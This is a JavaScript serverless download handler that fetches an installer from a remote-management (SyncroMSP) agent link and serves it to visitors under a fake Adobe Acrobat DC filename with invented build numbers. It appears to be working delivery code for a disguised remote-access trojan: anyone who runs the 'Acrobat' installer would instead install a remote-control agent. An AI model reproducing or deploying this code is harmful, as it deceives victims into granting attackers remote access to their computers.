export default async function handler(req, res) {
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET, HEAD, OPTIONS')
  res.setHeader('Access-Control-Allow-Headers', 'Content-Type')
  res.setHeader('Access-Control-Expose-Headers', 'Content-Disposition')
  
  if (req.method === 'OPTIONS') {
    res.status(200).end()
    return
  }
  
  if (req.method !== 'GET' && req.method !== 'HEAD') {
    res.status(405).json({ error: 'Method not allowed' })
    return
  }

  // Use timestamp from query to generate consistent filename
  const timestamp = req.query.t || Date.now().toString()
  
  // Use timestamp as seed for consistent random number
  const seed = parseInt(timestamp.slice(-6))
  const buildNum = 10000 + (seed % 90000)
  const fileTimestamp = timestamp.slice(-6)
  
  const fileName = `AdobeAcrobatDC_2025.003.${buildNum}_${fileTimestamp}.msi`
  
  console.log('Generated filename:', fileName, 'for timestamp:', timestamp)
  
  // Direct link to MSI file (replace with your actual link)
  const msiDownloadLink = 'https://rmm.syncromsp.com/dl/msi/djEtMzUwMzkxOTEtMTgwMDg2NjQ4NS03NzA4My00ODIzMDc2'
  
  try {
    // Fetch the file from the remote URL
    const response = await fetch(msiDownloadLink)
    
    if (!response.ok) {
      console.error('Failed to fetch file from link')
      res.status(404).send('File not found')
      return
    }
    
    const contentLength = response.headers.get('content-length')
    
    res.setHeader('Content-Type', 'application/x-msi')
    res.setHeader('Content-Disposition', `attachment; filename="${fileName}"`)
    if (contentLength) {
      res.setHeader('Content-Length', contentLength)
    }
    
    // If HEAD request, just send headers
    if (req.method === 'HEAD') {
      res.status(200).end()
      return
    }
    
    // Stream the file from the URL to the response
    const reader = response.body.getReader()
    
    while (true) {
      const { done, value } = await reader.read()
      if (done) break
      res.write(Buffer.from(value))
    }
    
    res.end()
    
  } catch (error) {
    console.error('Error:', error)
    if (!res.headersSent) {
      res.status(500).send('Download error')
    }
  }
}
